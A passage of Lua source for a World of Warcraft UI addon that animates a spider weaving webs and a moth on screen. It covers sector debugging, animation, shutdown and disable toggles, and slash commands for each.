            currentDbg.workerFrame = nil
            currentDbg.queue = nil

            self:Echo(string.format(
                "Визуализация: %d текстур, %d подписей. Очистка: /nspsectors clear",
                #currentDbg.textures,
                #currentDbg.fonts
            ))
        end
    end)

    dbg.workerFrame:Show()
end

function NSPauk:NP_DebugSectors(noVisual)
    local S = self.S
    local inst = S.currentInstance
    if not inst then
        self:Echo("Нет текущей паутины: S.currentInstance = nil")
        return
    end

    if inst.isCocoon or inst.isMoth then
        self:Echo("Сектора не строятся для коконов и мотыльков.")
        return
    end
    local N = inst.conns and #inst.conns or 0
    local sectors = self:NP_GetValidTriangleSectors(inst)
    self:Echo(string.format(
        "Instance id=%s, isCocoon=%s, isMoth=%s, isNaturalRing=%s, conns=%d, sectors=%d, crossSegs=%d, torn=%s, phase=%s",
        tostring(inst.id),
        tostring(inst.isCocoon),
        tostring(inst.isMoth),
        tostring(inst.isNaturalRing),
        N,
        #(sectors or {}),
        inst.crossSegs and #inst.crossSegs or 0,
        tostring(inst.torn),
        tostring(S.phase)
    ))
    if N == 0 then
        self:Echo("В текущей паутине нет нитей.")
        return
    end
    local hubValid = self:ValidateAnchorRect(inst.hub and inst.hub.rect)
    self:Echo(string.format(
        "Хаб: %s, anchor valid=%s",
        tostring(inst.hub and inst.hub.name or "?"),
        tostring(hubValid)
    ))

    for i, conn in ipairs(inst.conns) do
        local targetName = conn.target and conn.target.name or "?"
        local anchorValid = false
        if conn.target then
            anchorValid = self:ValidateAnchorRect(conn.target.rect)
        end
        local drawn = conn.textures and #conn.textures or 0
        local localAng = 0
        if type(self.NP_LocalAngleAtHub) == "function" then
            localAng = self:NP_LocalAngleAtHub(inst, conn) * 180 / math.pi
        end

        local threadType = "обычная"
        if conn.isSpoke then
            threadType = "спица"
        elseif conn.isDiameter then
            threadType = "диаметр"
        elseif conn.isRingFrame then
            threadType = "периметр"
        end
        local sectorFlag = conn.noSector and "нет" or "да"
        self:Echo(string.format(
            "Нить %d [%s]: цель=%s, alive=%s, drawn=%d, arcLen=%.1f, угол=%.1f, anchor=%s, сектор=%s",
            i,
            threadType,
            tostring(targetName),
            tostring(conn.alive),
            drawn,
            conn.arcLength or 0,
            localAng,
            tostring(anchorValid),
            sectorFlag
        ))
    end

    local spacing = tonumber(self.C.CROSS_ROW_SPACING) or 20
    if spacing < 0.5 then
        spacing = 0.5
    end
    for _, sector in ipairs(sectors or {}) do
        local connA = inst.conns[sector.a]
        local connB = inst.conns[sector.b]
        local angle = 0
        if connA and connB and type(self.NP_LocalAngleAtHub) == "function" then
            local aAng = self:NP_LocalAngleAtHub(inst, connA)
            local bAng = self:NP_LocalAngleAtHub(inst, connB)
            local delta = bAng - aAng
            while delta < 0 do
                delta = delta + 2 * math.pi
            end
            while delta >= 2 * math.pi do
                delta = delta - 2 * math.pi
            end
            if delta > math.pi then
                delta = 2 * math.pi - delta
            end
            angle = delta * 180 / math.pi
        end
        local planned, drawn, pending, dead = 0, 0, 0, 0
        for _, seg in ipairs(inst.crossSegs or {}) do
            if seg.planSectorKey == sector.key and not seg.isInterCross then
                planned = planned + 1
                if seg.alive then
                    if self:NP_IsWebOwnerDrawn(seg) then
                        drawn = drawn + 1
                    else
                        pending = pending + 1
                    end
                else
                    dead = dead + 1
                end
            end
        end
        local expectedRows = math.floor((sector.pairMin or 0) / spacing)
        self:Echo(string.format(
            "Сектор %s: угол=%.1f, pairMin=%.1f, рядов~%d, перемычек план=%d, нарисовано=%d, ожидает=%d, мертво=%d",
            tostring(sector.key),
            angle,
            sector.pairMin or 0,
            expectedRows,
            planned,
            drawn,
            pending,
            dead
        ))
    end

    local stats = self:NP_GetWebCompletionStats(inst)
    self:Echo(string.format(
        "Итог: основные %d/%d, перемычки план=%d, нарисовано=%d, ожидает=%d, мертво=%d, crossSegs alive=%d/%d",
        stats.mainDrawn,
        stats.mainTotal,
        stats.crossPlanned,
        stats.crossDrawn,
        stats.crossPending,
        stats.crossDead,
        stats.crossSegAlive,
        stats.crossPlanned
    ))
    local scheduled = self:NP_CollectScheduledOwners()
    local schedCount = 0
    for _ in pairs(scheduled) do
        schedCount = schedCount + 1
    end
    self:Echo("Запланировано владельцев в очереди: " .. tostring(schedCount))
    if not noVisual then
        self:NP_DrawSectorsDebug()
    end
end

function NSPauk:Echo(message)
    if type(message) ~= "string" then
        message = tostring(message)
    end

    if DEFAULT_CHAT_FRAME and DEFAULT_CHAT_FRAME.AddMessage then
        DEFAULT_CHAT_FRAME:AddMessage("|cffffcc00NSPauk:|r " .. message)
    elseif type(print) == "function" then
        print("NSPauk: " .. message)
    end
end

function NSPauk:NP_GetSectorRowArcs(connA, connB)
    local C = self.C or {}

    local spacing = tonumber(C.CROSS_ROW_SPACING) or 20

    if spacing < 0.5 then
        spacing = 0.5
    end

    local minCross = tonumber(C.MIN_CROSS_LEN) or 4

    if minCross < 0 then
        minCross = 4
    end

    local maxRows = tonumber(C.MAX_CROSS_ROWS) or 1600

    if maxRows < 0 then
        maxRows = 1600
    end

    local lenA = tonumber(connA and connA.arcLength) or 0
    local lenB = tonumber(connB and connB.arcLength) or 0

    if lenA < 0 then
        lenA = 0
    end

    if lenB < 0 then
        lenB = 0
    end

    -- Важно: берём более длинную нить.
    -- Короткая нить дальше своей последней точки уже не идёт,
    -- а длинная продолжает тянуться.
    local maxLen = math.max(lenA, lenB)

    local out = {}

    if maxLen < minCross then
        return out
    end

    local rows = 0
    local arcLen = spacing

    while arcLen <= maxLen and rows < maxRows do
        out[#out + 1] = arcLen
        arcLen = arcLen + spacing
        rows = rows + 1
    end

    local last = out[#out]

    if not last then
        if rows < maxRows then
            out[#out + 1] = maxLen
        end
    else
        local tail = maxLen - last

        if tail > 0.001 then
            local snapTol = spacing * 0.6

            if tail <= snapTol then
                out[#out] = maxLen
            elseif rows < maxRows then
                out[#out + 1] = maxLen
            end
        end
    end

    return out
end

function NSPauk:IsPersistentlyDisabled()
    if type(nsDbc) ~= "table" then
        return false
    end

    local db = nsDbc["паук"]
    if type(db) ~= "table" then
        return false
    end

    return db.disabled == true
end

function NSPauk:SetPersistentDisabled(flag)
    if type(nsDbc) ~= "table" then
        nsDbc = {}
    end

    if type(nsDbc["паук"]) ~= "table" then
        nsDbc["паук"] = {}
    end

    nsDbc["паук"].disabled = flag and true or false
    return nsDbc["паук"].disabled
end

function NSPauk:OnUpdateGuarded(dt)
    local S = self.S
    if type(S) ~= "table" then
        return
    end
    if not self.initialized or S.runtimeOff or S.phase == "off" then
        return
    end
    if self:IsPersistentlyDisabled() then
        return
    end
    if type(self.NP_CombatHidePreUpdate) == "function" then
        if self:NP_CombatHidePreUpdate(dt) then
            return
        end
    end
    self:NP_UpdateAdaptive(dt)
    self:OnUpdate(dt)
    self:UpdateSpiderAnimation(dt)
    self:NP_PostUpdate()
end

function NSPauk:NP_GetWebCompletionStats(inst)
    local stats = {
        mainTotal = 0,
        mainDrawn = 0,
        crossPlanned = 0,
        crossDrawn = 0,
        crossPending = 0,
        crossDead = 0,
        crossMissing = 0,
        crossSegAlive = 0,
        crossSegDrawn = 0,
    }

    if not inst then
        return stats
    end

    for _, conn in ipairs(inst.conns or {}) do
        if not conn.isDiameter then
            stats.mainTotal = stats.mainTotal + 1

            if self:NP_IsWebOwnerDrawn(conn) then
                stats.mainDrawn = stats.mainDrawn + 1
            end
        end
    end

    for _, seg in ipairs(inst.crossSegs or {}) do
        if not seg.isInterCross then
            stats.crossPlanned = stats.crossPlanned + 1

            if seg.alive then
                stats.crossSegAlive = stats.crossSegAlive + 1

                if self:NP_IsWebOwnerDrawn(seg) then
                    stats.crossDrawn = stats.crossDrawn + 1
                    stats.crossSegDrawn = stats.crossSegDrawn + 1
                else
                    stats.crossPending = stats.crossPending + 1
                end
            else
                stats.crossDead = stats.crossDead + 1
            end
        end
    end

    return stats
end

function NSPauk:RuntimeShutdown()
    local S = self.S

    if type(S) ~= "table" then
        return
    end

    local function safeCall(func, ...)
        if type(func) ~= "function" then
            return
        end

        if type(pcall) == "function" then
            pcall(func, ...)
        else
            func(...)
        end
    end

    self.initialized = false
    S.runtimeOff = true
    S.phase = "off"

    if self.eventFrame then
        self.eventFrame:UnregisterAllEvents()
        self.eventFrame:SetScript("OnEvent", nil)
    end

    if self.F_HIGH then
        self.F_HIGH:SetScript("OnUpdate", nil)
        self.F_HIGH:Hide()
    end

    if self.F_SPIDER then
        self.F_SPIDER:Hide()
    end

    if self.F_CLICK then
        self.F_CLICK:Hide()
    end

    if self.killConfirmFrame then
        self.killConfirmFrame:Hide()
    end

    if self.levelUpFrame then
        self.levelUpFrame:Hide()
    end

    S.limitReached = false
    S.limitReturnPending = false
    S.limitCocoonPending = false
    S.limitWaitTimer = 0
    S.limitHomePoint = nil
    S.inCombat = false
    S.combatHide = false
    S.combatHideUntil = 0

    S.suppressSettle = true

    safeCall(self.NP_ClearGlobalDrag, self, false)
    safeCall(self.NP_ClearTempOwners, self)
    safeCall(self.AbortMothHunt, self, true, true, true)
    safeCall(self.ClearAllVisuals, self)
    safeCall(self.AbortCocoon, self)
    safeCall(self.RestoreDigestedFrames, self)


    safeCall(self.CancelUIParentRestore, self, true)

    S.suppressSettle = false

    safeCall(self.ResetSessionRecord, self)

    -- Безопасно прячем текстуры из пула без GetRegions().
    if type(S.webPool) == "table" then
        for _, texture in ipairs(S.webPool) do
            if texture and texture.Hide then
                texture:Hide()
            end
        end
    end

    S.phase = "off"
    S.runtimeOff = true
    S.suppressSettle = false

    S.initTimer = 0
    S.speedTimer = 0
    S.stillTimer = 0
    S.completeTimer = 0
    S.monitorTimer = 0
    S.mouseTimer = 0
    S.mouseIdle = 0
    S.mouseOnThread = nil
    S.disableTimer = 0
    S.limitWaitTimer = 0
    S.mothCheckTimer = 0
    S.lastTaskT = 0
    S.moveDur = 1
    S.moveT = 0
    S.lastSpiderX = 0
    S.lastSpiderY = 0
    S.lastDropX = 0
    S.lastDropY = 0
    S.webPoints = 0
    S.webAliveCount = 0
    S.webCreated = 0

    S.nspFrameCache = nil
    S.nspSupportCache = nil
    S.nspNearCache = nil
    S.nspLastRoute = nil
    S.nspDrag = nil
    S.nspTempOwners = {}
    S.nspRouteHistory = {}
    S.nspRouteContext = nil
    S.nspRouteLoopHandled = nil

    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.instances = {}
    S.currentInstance = nil
    S.cocoon = nil
    S.moth = nil
    S.digestedFrames = {}
    S.fades = {}

    S.limitReached = false
    S.limitReturnPending = false
    S.limitCocoonPending = false
    S.limitHomePoint = nil
    S.inCombat = false
    S.combatHide = false
    S.combatHideUntil = 0

    self.nextInstanceId = 1

    if self.F_HIGH then
        self.F_HIGH:Hide()
    end

    if self.F_SPIDER then
        self.F_SPIDER:Hide()
    end

    if self.F_CLICK then
        self.F_CLICK:Hide()
    end

    if S.spider and S.spider.Hide then
        S.spider:Hide()
    end

    if S.clickBtn and S.clickBtn.Hide then
        S.clickBtn:Hide()
    end

    safeCall(self.HideSpider, self)
end

function NSPauk:Activate()
    if self:IsPersistentlyDisabled() then
        return false
    end

    local S = self.S
    if type(S) ~= "table" then
        return false
    end

    S.runtimeOff = false
    S.suppressSettle = false

    if not self.initialized or not self.F_HIGH then
        self.initialized = false
        self:LoadConstants()
        self:SetMode("base")
        self:Init()
        return self.initialized == true
    end

    self:LoadConstants()
    self:SetMode("base")

    if not self.eventFrame then
        self.eventFrame = CreateFrame("Frame")
    end

    self.eventFrame:SetScript("OnEvent", function(_, event)
        NSPauk:OnEvent(event)
    end)

    self.eventFrame:RegisterEvent("PLAYER_LOGIN")
    self.eventFrame:RegisterEvent("PLAYER_ENTERING_WORLD")

    if self.F_HIGH then
        self.F_HIGH:SetScript("OnUpdate", function(_, dt)
            NSPauk:OnUpdateGuarded(dt)
        end)
        self.F_HIGH:Show()
    end

    if self.F_SPIDER then
        self.F_SPIDER:Show()
    end

    if self.F_CLICK then
        self.F_CLICK:Show()
    end

    if S.phase == "off" then
        S.phase = "watch"
    end

    S.initTimer = 0
    S.stillTimer = 0
    S.speedTimer = 0
    S.completeTimer = 0
    S.monitorTimer = 0
    S.mouseTimer = 0
    S.disableTimer = 0
    S.limitWaitTimer = 0
    S.mothCheckTimer = 0
    S.SW, S.SH = self:GetScreenSize()

    return true
end

function NSPauk:Init()
    if self.initialized then
        return
    end

    if self:IsPersistentlyDisabled() then
        return
    end

    self.initialized = true
    self:LoadConstants()

    local C = self.C
    local S = self.S

    S.runtimeOff = false
    if S.phase == "off" then
        S.phase = "watch"
    end

    S.SW, S.SH = self:GetScreenSize()
    S.webAliveCount = 0
    S.limitReached = false
    S.limitReturnPending = false
    S.limitCocoonPending = false
    S.limitWaitTimer = 0
    S.limitHomePoint = nil

    local function prepareFrame(field, name, strata, level)
        local f = self[field]

        if not f and _G then
            f = _G[name]
        end

        if not f then
            f = CreateFrame("Frame", name, UIParent)
        end

        f:ClearAllPoints()
        f:SetAllPoints(UIParent)
        f:SetFrameStrata(strata)
        f:SetFrameLevel(level)
        f:EnableMouse(false)
        f:Show()

        self[field] = f
        return f
    end

    self.F_HIGH = prepareFrame("F_HIGH", C.ADDON .. "_WebHigh", "TOOLTIP", 100)
    S.activeFrame = self.F_HIGH

    self.F_SPIDER = prepareFrame("F_SPIDER", C.ADDON .. "_SpiderHigh", "TOOLTIP", 101)
    S.spiderFrame = self.F_SPIDER

    self.F_CLICK = prepareFrame("F_CLICK", C.ADDON .. "_ClickHigh", "TOOLTIP", 102)
    S.clickFrame = self.F_CLICK

    if type(C.EXCLUDE_FRAMES) ~= "table" then
        C.EXCLUDE_FRAMES = {}
    end

    C.EXCLUDE_FRAMES[C.ADDON .. "_WebHigh"] = true
    C.EXCLUDE_FRAMES[C.ADDON .. "_SpiderHigh"] = true
    C.EXCLUDE_FRAMES[C.ADDON .. "_ClickHigh"] = true

    self.F_HIGH:SetScript("OnUpdate", function(_, dt)
        NSPauk:OnUpdateGuarded(dt)
    end)

    if self.F_HIGH.HookScript and self.postUpdateHookedFrame ~= self.F_HIGH then
        self.F_HIGH:HookScript("OnUpdate", function()
            NSPauk:NP_PostUpdate()
        end)
        self.postUpdateHookedFrame = self.F_HIGH
    end

    if not self.eventFrame then
        self.eventFrame = CreateFrame("Frame")
    end

    self.eventFrame:RegisterEvent("PLAYER_LOGIN")
    self.eventFrame:RegisterEvent("PLAYER_ENTERING_WORLD")

    self.eventFrame:SetScript("OnEvent", function(_, event)
        NSPauk:OnEvent(event)
    end)
end

NSPauk.Modes = {}
NSPauk.BaseMethods = {}

for name, value in pairs(NSPauk) do
    if type(value) == "function" then
        NSPauk.BaseMethods[name] = value
    end
end

NSPauk.Modes.base = NSPauk.BaseMethods

function NSPauk:RegisterMode(name, methods)
    if type(name) ~= "string" or type(methods) ~= "table" then
        return
    end

    self.Modes[name] = methods
end

function NSPauk:SetMode(name)
    if not self.Modes or not self.Modes[name] then
        name = "base"
    end

    self.S.mode = name

    for key, value in pairs(self.BaseMethods) do
        self[key] = value
    end

    if name ~= "base" then
        for key, value in pairs(self.Modes[name]) do
            if type(value) == "function" then
                self[key] = value
            end
        end
    end
end

function NSPauk:GetMode()
    return self.S.mode
end

function NSPauk:CallBase(name, ...)
    local func = self.BaseMethods[name]

    if func then
        return func(self, ...)
    end
end

NSPauk:SetMode("base")

if not NSPauk:Activate() then
    NSPauk.S.runtimeOff = true
    NSPauk.S.phase = "off"
end

function NSPauk:GetSpiderProfileKey()
    local db = self:EnsureDB()

    local profiles = self.SpiderTextureProfiles
    if type(profiles) ~= "table" then
        profiles = {}
    end

    local key = db.spiderProfile

    if key == "animated" then
        key = "default"
        db.spiderProfile = key
    end

    if type(key) ~= "string"
        or key == ""
        or not profiles[key] then

        if profiles.default then
            key = "default"
        else
            local firstKey = next(profiles)
            if firstKey then
                key = firstKey
            else
                key = "default"
            end
        end

        db.spiderProfile = key
    end

    return key
end

function NSPauk:GetSpiderProfile()
    local key = self:GetSpiderProfileKey()
    local profile = self.SpiderTextureProfiles and self.SpiderTextureProfiles[key]

    if not profile then
        profile = self.SpiderTextureProfiles and self.SpiderTextureProfiles.default
    end

    if not profile or type(profile.textures) ~= "table" or #profile.textures == 0 then
        return {
            label = "default",
            textures = {
                (self.C and self.C.TEX_SPIDER) or "DEFAULT",
            },
        }
    end

    return profile
end

function NSPauk:SetSpiderProfile(key)
    if type(key) ~= "string" then
        return false
    end

    local profiles = self.SpiderTextureProfiles or {}

    if key == "animated" then
        key = "default"
    end

    if not profiles[key] then
        return false
    end

    local db = self:EnsureDB()
    db.spiderProfile = key

    local S = self.S

    S.spiderAnimIndex = 1
    S.spiderAnimTimer = 0
    S.spiderAnimMoving = false

    self:ApplySpiderTexture(1)

    local profile = profiles[key]

    self:Echo(string.format(
        "Профиль паука: %s (%s), текстур: %d",
        tostring(profile.label or key),
        key,
        profile.textures and #profile.textures or 0
    ))

    return true
end

function NSPauk:SetSpiderAnimInterval(value)
    value = tonumber(value)

    if not value or value ~= value or value <= 0 then
        self:Echo("Использование: /nspider interval <сек>")
        return false
    end

    if value < 0.05 then
        value = 0.05
    end

    if value > 5 then
        value = 5
    end

    local db = self:EnsureDB()
    db.constants.SPIDER_ANIM_INTERVAL = value

    if self.C then
        self.C.SPIDER_ANIM_INTERVAL = value
    end

    self:Echo(string.format(
        "Интервал смены кадров паука: %.3f сек.",
        value
    ))

    return true
end

function NSPauk:ApplySpiderTexture(index)
    local S = self.S
    local C = self.C
    local spider = S.spider

    if not spider then
        return
    end

    local profile = self:GetSpiderProfile()
    local list = profile and profile.textures

    if type(list) ~= "table" or #list == 0 then
        list = { C.TEX_SPIDER }
    end

    if type(index) ~= "number" or index < 1 or index > #list then
        index = 1
    end

    local path = list[index]
    local fallback = C and C.TEX_SPIDER or ""

    if type(path) ~= "string" or path == "" or path == "DEFAULT" then
        path = fallback
    end

    spider:SetTexture(path)
    spider:SetWidth(C.SPIDER_SIZE)
    spider:SetHeight(C.SPIDER_SIZE)
    spider:SetDrawLayer("OVERLAY")

    self:SetSpiderRotation(spider, S.spiderFacing or 0)

    S.spiderTextureIndex = index
end

function NSPauk:SetSpiderRotation(tex, angle)
    if not tex or not tex.SetTexCoord then
        return
    end

    angle = tonumber(angle) or 0

    local c = math.cos(angle)
    local s = math.sin(angle)

    -- Поворот UV-координат.
    -- Верх текстуры считается головой.
    --
    -- Если вдруг на диагоналях появляются артефакты из-за выхода UV
    -- за пределы [0..1], можно заменить строку ниже на:
    -- local fit = 1 / (math.abs(c) + math.abs(s))
    --
    -- Тогда повёрнутая текстура будет чуть вписываться в квадрат,
    -- но на 45 градусах может слегка увеличиваться центральная часть.
    local fit = 1.0

    local function uv(px, py)
        local rx = px * c + py * s
        local ry = -px * s + py * c
        return 0.5 + rx * fit, 0.5 + ry * fit
    end

    local ulx, uly = uv(-0.5, -0.5)
    local llx, lly = uv(-0.5, 0.5)
    local urx, ury = uv(0.5, -0.5)
    local lrx, lry = uv(0.5, 0.5)

    tex:SetTexCoord(
        ulx, uly,
        llx, lly,
        urx, ury,
        lrx, lry
    )
end

function NSPauk:NormalizeAngle(a)
    a = tonumber(a) or 0
    local pi = math.pi

    while a > pi do
        a = a - 2 * pi
    end

    while a < -pi do
        a = a + 2 * pi
    end

    return a
end

function NSPauk:UpdateSpiderAnimation(dt)
    local S = self.S

    if not self.initialized or S.runtimeOff or S.phase == "off" then
        return
    end

    if S.combatHide then
        return
    end

    local spider = S.spider
    if not spider or not spider:IsShown() then
        return
    end

    dt = tonumber(dt) or 0

    if dt < 0 then
        dt = 0
    end

    -- Защита от редких больших скачков dt.
    if dt > 0.25 then
        dt = 0.25
    end

    -- Используем реальные координаты паука, а не только визуально
    -- обновлённые spiderVisualX/Y, иначе таймер анимации может
    -- сбрасываться между редкими обновлениями визуала.
    local x = S.lastSpiderX or 0
    local y = S.lastSpiderY or 0

    local lastX = S.spiderAnimLastX
    local lastY = S.spiderAnimLastY

    if type(lastX) ~= "number" or type(lastY) ~= "number" then
        lastX = x
        lastY = y
    end

    local dx = x - lastX
    local dy = y - lastY
    local dist2 = dx * dx + dy * dy

    -- Паук реально движется.
    -- 0.0001 примерно соответствует расстоянию 0.01 px.
    if dist2 > 0.0001 then
        local target = math.atan2(dx, dy)
        local current = S.spiderFacing

        if type(current) ~= "number" or current ~= current then
            current = target
        end

        -- Если это первый кадр или резкий телепорт/сброс позиции,
        -- поворачиваем сразу, иначе плавно доворачиваем.
        if not S.spiderAnimInitialized or dist2 > 64 then
            current = target
        else
            local diff = self:NormalizeAngle(target - current)
            local smooth = math.min(1, dt * 12)

            if smooth <= 0 then
                smooth = 1
            end

            current = current + diff * smooth
        end

        S.spiderFacing = self:NormalizeAngle(current)
        S.spiderAnimInitialized = true

        self:SetSpiderRotation(spider, S.spiderFacing)

        if not S.spiderAnimMoving then
            S.spiderAnimMoving = true
            S.spiderAnimIndex = 1
            S.spiderAnimTimer = 0
            self:ApplySpiderTexture(1)
        end

        local profile = self:GetSpiderProfile()
        local count = profile and profile.textures and #profile.textures or 1

        if count > 1 then
            local interval = tonumber(self.C and self.C.SPIDER_ANIM_INTERVAL) or 0.18

            if type(interval) ~= "number"
                or interval ~= interval
                or interval < 0.05 then
                interval = 0.18
            end

            S.spiderAnimTimer = (S.spiderAnimTimer or 0) + dt

            -- Если вдруг был лаг/большой dt, можем пропустить несколько кадров,
            -- но не зависнуть.
            while S.spiderAnimTimer >= interval do
                S.spiderAnimTimer = S.spiderAnimTimer - interval
                S.spiderAnimIndex = ((S.spiderAnimIndex or 1) % count) + 1
                self:ApplySpiderTexture(S.spiderAnimIndex)
            end
        end
    else
        if S.spiderAnimMoving then
            S.spiderAnimMoving = false
            S.spiderAnimTimer = 0

        end
    end

    S.spiderAnimLastX = x
    S.spiderAnimLastY = y
end

function NSPauk:PrintSpiderProfiles()
    local profiles = self.SpiderTextureProfiles or {}
    local keys = {}

    for key in pairs(profiles) do
        keys[#keys + 1] = key
    end

    table.sort(keys)

    local current = self:GetSpiderProfileKey()

    self:Echo("Профили паука:")

    for _, key in ipairs(keys) do
        local p = profiles[key]
        local mark = (key == current) and "*" or " "

        self:Echo(string.format(
            "%s %s — %s, текстур: %d",
            mark,
            key,
            tostring(p.label or key),
            p.textures and #p.textures or 0
        ))
    end

    self:Echo("Выбор: /nspider profile <ключ>.")
    self:Echo("Интервал: /nspider interval <сек>.")
end

function NSPauk:HandleSpiderCommand(msg)
    msg = type(msg) == "string" and msg or ""
    msg = msg:gsub("^%s+", "")
    msg = msg:gsub("%s+$", "")

    if msg == "" or msg == "help" then
        self:Echo("Команды:")
        self:Echo("/nspider list — список профилей")
        self:Echo("/nspider current — текущий профиль и интервал")
        self:Echo("/nspider profile <ключ> — выбрать профиль")
        self:Echo("/nspider interval <сек> — интервал смены кадров")
        self:Echo("Пример: /nspider interval 0.18")
        return
    end

    if msg == "list" then
        self:PrintSpiderProfiles()
        return
    end

    if msg == "current" then
        local key = self:GetSpiderProfileKey()
        local profile = self:GetSpiderProfile()
        local interval = tonumber(self.C and self.C.SPIDER_ANIM_INTERVAL) or 0.18

        self:Echo(string.format(
            "Текущий профиль: %s (%s), текстур: %d, интервал: %.3f сек.",
            tostring(profile.label or key),
            key,
            profile.textures and #profile.textures or 0,
            interval
        ))
        return
    end

    local cmd, arg = msg:match("^(%S+)%s+(.+)$")
    if not cmd then
        cmd = msg
    end

    if cmd == "profile" or cmd == "set" then
        arg = type(arg) == "string" and arg:gsub("%s+$", "") or ""

        if arg == "" then
            self:Echo("Использование: /nspider profile <ключ>")
            self:PrintSpiderProfiles()
            return
        end

        if not self:SetSpiderProfile(arg) then
            self:Echo(string.format("Неизвестный профиль: %s", arg))
            self:PrintSpiderProfiles()
        end

        return
    end

    if cmd == "interval" then
        arg = type(arg) == "string" and arg:gsub("%s+$", "") or ""

        if arg == "" then
            local interval = tonumber(self.C and self.C.SPIDER_ANIM_INTERVAL) or 0.18
            self:Echo(string.format(
                "Текущий интервал: %.3f сек. Изменить: /nspider interval <сек>",
                interval
            ))
            return
        end

        self:SetSpiderAnimInterval(tonumber(arg))
        return
    end

    self:Echo("Неизвестная команда. Используй /nspider help.")
end

if type(SlashCmdList) == "table" then
    local cmdName = "NSPAUKSPIDER"

    if not SlashCmdList[cmdName] then
        SlashCmdList[cmdName] = function(msg)
            NSPauk:HandleSpiderCommand(msg)
        end

        if _G then
            _G["SLASH_" .. cmdName .. "1"] = "/nspider"
            _G["SLASH_" .. cmdName .. "2"] = "/paukspider"
        end
    end
end

if type(SlashCmdList) == "table" then
    local cmdName = "NSPAUKSECTORS"
    if not SlashCmdList[cmdName] then
        SlashCmdList[cmdName] = function(msg)
            if NSPauk:IsPersistentlyDisabled() or not NSPauk.initialized then
                NSPauk:Echo("Паук выключен. Для включения используй /paukblock.")
                return
            end
            msg = type(msg) == "string" and msg or ""
            msg = msg:gsub("^%s+", "")
            msg = msg:gsub("%s+$", "")

            if msg == "clear" then
                NSPauk:NP_ClearSectorsDebug()
                NSPauk:Echo("Визуализация секторов очищена.")
                return
            end

            if msg == "text" then
                NSPauk:NP_DebugSectors(true)
                return
            end

            local cmd, arg = msg:match("^(%S+)%s+(%S+)$")
            if cmd == "angle" and tonumber(arg) then
                local value = tonumber(arg)
                if value < 0 then
                    value = 0
                end
                if value > 360 then
                    value = 360
                end
                NSPauk.C.CROSS_MAX_SECTOR_ANGLE = value
                if type(NSPauk.DB) == "table"
                    and type(NSPauk.DB.constants) == "table" then
                    NSPauk.DB.constants.CROSS_MAX_SECTOR_ANGLE = value
                end
                NSPauk:Echo(string.format(
                    "CROSS_MAX_SECTOR_ANGLE=%.1f. Для применения создай новую паутину.",
                    value
                ))
            elseif cmd == "angle" then
                NSPauk:Echo("Использование: /nspsectors angle 160")
            else
                NSPauk:NP_DebugSectors(false)
            end
        end
        if _G then
            _G["SLASH_" .. cmdName .. "1"] = "/nspsectors"
            _G["SLASH_" .. cmdName .. "2"] = "/pauksectors"
        end
    end
end

if type(SlashCmdList) == "table" then
    local cmdName = "NSPAUKADAPT"

    if not SlashCmdList[cmdName] then
        SlashCmdList[cmdName] = function(msg)
            NSPauk:HandleAdaptiveCommand(msg)
        end

        if _G then
            _G["SLASH_" .. cmdName .. "1"] = "/nspadapt"
            _G["SLASH_" .. cmdName .. "2"] = "/paukadapt"
        end
    end
end

if type(SlashCmdList) == "table" then
    local cmdName = "NSPAUKOFF"

    if not SlashCmdList[cmdName] then
        SlashCmdList[cmdName] = function()
            if NSPauk:IsPersistentlyDisabled() then
                NSPauk:Echo("Паук уже выключен из сохранений. Для включения используй /paukblock.")
                return
            end

            NSPauk:RuntimeShutdown()
            NSPauk:Echo("Аварийное отключение выполнено. Все визуальные эффекты и таймеры убраны до перезахода. Сохранения не тронуты.")
        end

        if _G then
            _G["SLASH_" .. cmdName .. "1"] = "/nspoff"
            _G["SLASH_" .. cmdName .. "2"] = "/paukoff"
        end
    end
end

if type(SlashCmdList) == "table" then
    local cmdName = "NSPAUKBLOCK"

    if not SlashCmdList[cmdName] then
        SlashCmdList[cmdName] = function()
            if NSPauk:IsPersistentlyDisabled() then
                NSPauk:SetPersistentDisabled(false)

                if NSPauk:Activate() then
                    NSPauk:Echo("Сохранённое отключение снято. Паук запущен.")
                else
                    NSPauk:Echo("Сохранённое отключение снято, но запуск не удался. Попробуй /reload.")
                end
            else
                NSPauk:SetPersistentDisabled(true)
                NSPauk:RuntimeShutdown()
                NSPauk:Echo("Паук полностью отключён и записан в сохранения. Повтори /paukblock для включения.")
            end
        end

        if _G then
            _G["SLASH_" .. cmdName .. "1"] = "/nspblock"
            _G["SLASH_" .. cmdName .. "2"] = "/paukblock"
            _G["SLASH_" .. cmdName .. "3"] = "/nspdisable"
            _G["SLASH_" .. cmdName .. "4"] = "/paukdisable"
        end
    end
end



























































































































































































































---------------------------------------------------------------------------
-- NSPauk_Moth.lua
-- Release build.
---------------------------------------------------------------------------

if NSPauk_Moth then
    return
end

local NSPauk_Moth = {
    inited = false,
    frame = nil,
    tex = nil,
    tex1 = nil,
    tex2 = nil,
    bootstrap = nil,
    timerFrame = nil,
    respawnRemaining = nil,
    parentMode = "auto",
    destroyed = false,
    freezeRequested = false,

    stuckInfo = {
        stuck = false,
        x = 0,
        y = 0,
    },

    lastStuckInfo = nil,
    lastWebInfo = nil,

    cfg = {
        SIZE = 22,
        CLICK_AREA = 30,

        FLAP_FLY = 0.04,
        FLAP_STUCK = 0.06,

        SPEED_MIN = 80,
        SPEED_MAX = 165,

        BURST_SPEED_MIN = 60,
        BURST_SPEED_MAX = 150,

        TURN = 6.0,
        NOISE = 70,

        JERK_MIN = 0.14,
        JERK_MAX = 0.62,

        STICK_DIST = 9,
        CHECK_INTERVAL = 0.035,
        MARGIN = 12,

        STUCK_SPRING = 140,
        STUCK_DAMP = 10,

        STUCK_JERK_MIN = 0.04,
        STUCK_JERK_MAX = 0.18,
        STUCK_JERK_SPEED_MIN = 45,
        STUCK_JERK_SPEED_MAX = 130,
        STUCK_OFFSET_MAX = 5.5,

        DASH_DISTANCE = 50,
        DASH_IMPULSE = 220,
        DASH_IMMUNITY = 0.30,

        DEATH_FADE_TIME = 10,

        STICK_CONNS = true,
        STICK_CROSSSEGS = true,
        STICK_ONLY_VISIBLE_TEXTURE = true,
        STICK_VISIBLE_RADIUS = 6,

        STICK_CHANCE = 1 / 30,
        STICK_FAIL_IMMUNITY_MIN = 0.75,
        STICK_FAIL_IMMUNITY_MAX = 1.50,
        STICK_FAIL_REQUIRE_LEAVE = true,
        STICK_FAIL_IMPULSE_MIN = 90,
        STICK_FAIL_IMPULSE_MAX = 180,

        STICK_KIND_TRAVEL = false,
        STICK_NSPCRAWL = false,
        STICK_NSPNOINSERT = true,
